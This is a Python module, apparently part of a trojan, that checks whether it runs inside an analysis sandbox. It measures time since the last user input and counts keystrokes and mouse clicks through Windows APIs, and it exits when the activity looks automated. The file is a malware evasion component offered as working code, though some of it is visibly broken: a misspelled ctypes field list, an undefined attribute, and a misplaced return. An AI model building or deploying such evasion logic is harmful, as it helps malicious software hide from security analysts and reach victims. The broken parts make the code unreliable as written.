'''
This module only returns the elasped time since the user entered input.
Functionality to determine when a user is active or offline is not implemented.
Examples:
If there is no input within 10 mins of use, likley a sandbox
    If decided if not a sandbox, edit the config
Tracking user interaction times to when they are active or offline
Take screenshots only when active
Perform other tasks only when user is away
'''

from ctypes import byref, c_uint, c_ulong, sizeof, Structure, windll
import random
import sys
import win32api
import time

# Structure that holds a time stamp of last event
class LASTINPUTINFO(Structure):
    fields_ = [('cbSize', c_uint), ('dwTime', c_ulong)]

def get_last_input():
    struct_lastinputinfo = LASTINPUTINFO()
    struct_lastinputinfo.cbSize = sizeof(LASTINPUTINFO)
    # Populates the field with a timestamp
    windll.user32.GetLastInputInfo(byref(struct_lastinputinfo))
    # Time of the machine running
    run_time = windll.kernel32.GetTickCount()
    # Elapsed = total time running - total time running
    elapsed = run_time - struct_lastinputinfo.dwTime
    print(f"It has beeen {elapsed} milliseconds since last event")
    return elapsed

# Detector class with logic
class Detector:
    def __init__(self):
        # Initialize events to default to 0
        self.double_clicks = 0
        self.keystrokes = 0
        self.mouse_clicks = 0

    def get_key_press(self):
        for i in range(0, 0xff):
            # Check if an event occurs
            state = win32api.GetAsyncKeyState(i)
            # (state & 0x0001) is a truth statement
            if state & 0x0001:
                # Mouse click
                if i == 0x1:
                    self.mouse_clicks += 1
                    # Return the current timestamp to perform calcs on later
                    return time.time()
                # Ascii keys
                elif i > 32 and i < 127:
                    self.keystrokes += 1
            return None

    def detect(self):
        # Defining vars for maxes and thresholds
        previous_timestamp = None
        first_double_click = None
        double_click_threshold = 0.35

        max_double_clicks = 10
        max_keystrokes = random.randint(10, 25)
        max_mouse_clicks = random.randint(5, 25)
        # 30 seconds
        max_input_threshold = 30000

        # Get the last time, if it is over the threshold, exit
        last_input = get_last_input()
        if last_input > max_input_threshold:
            # Kills the trojan, can do other activities
            # Ex. remove self, read registry keys, check files - innocuous activities
            sys.exit(0)


        detection_complete = False
        while not detection_complete:
            # Check the first key press and time stamp
            keypress_time = self.get_key_press()
            if keypress_time is not None and previous_timestamp is not None:
                # Calculate time elapsed
                elapsed = keypress_time - previous_timestamp

                # If the time elasped is withing the timing for a double click
                # Two mouse_clicks within a short time = a double click, not two mouse clicks
                if elapsed <= double_click_threshold:
                    self.mouse_clicks -= 2
                    self.double_clicks += 1
                    if first_double_click is None:
                        first_double_click = time.time()
                    else:
                        # Has the sandbox been streaming clicks
                        # Seeing 100 double_clicks in a row would be weird
                        if self.double_clicks >= max_double_clicks:
                            # If the clicks happened in rapid succession, kill trojan
                            if (keypress_time - first_double_click <= (max_double_clicks * double_click_threshold)):
                                sys.exit(0)
                # IF we have passed all checks, break out of the sandbox check, can say we are not in a sandbox
                if (self.keystrokes >= max_keystrokes and self.double_clicks >= max_double_clicks and
                        self.max_mouse_clicks >= max_mouse_clicks):
                    detection_complete = True

                previous_timestamp = keypress_time

            # If this is the first timestamp
            elif keypress_time is not None:
                previous_timestamp = keypress_time

if __name__ == "__main__":
    d = Detector()
    d.detect()
    print("Okay.")
